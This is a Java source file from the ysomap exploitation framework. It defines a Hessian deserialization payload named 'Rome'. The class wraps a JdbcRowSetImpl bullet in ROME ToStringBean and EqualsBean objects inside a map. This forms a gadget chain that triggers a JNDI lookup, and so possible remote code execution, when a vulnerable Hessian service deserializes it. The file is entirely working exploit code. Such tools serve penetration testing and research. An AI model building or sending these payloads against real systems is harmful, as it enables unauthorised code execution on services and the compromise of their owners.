package ysomap.payloads.hessian;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.JdbcRowSetImplBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;

/**
 * @author wh1t3p1g
 * @since 2021/8/5
 */
@Payloads
@Authors({ Authors.MBECHLER })
@Targets({Targets.HESSIAN})
@Require(bullets = {"JdbcRowSetImplBullet"},param = false)
@Dependencies({"com.rometools:rome:1.11.1"})
public class Rome extends HessianPayload{

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return JdbcRowSetImplBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Class<?> type = obj.getClass();
        ToStringBean bean = new ToStringBean(type, obj);
        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, bean);

        return PayloadHelper.makeMap(equalsBean, equalsBean);
        // using XString triger to ToStringBean also work
    }
}
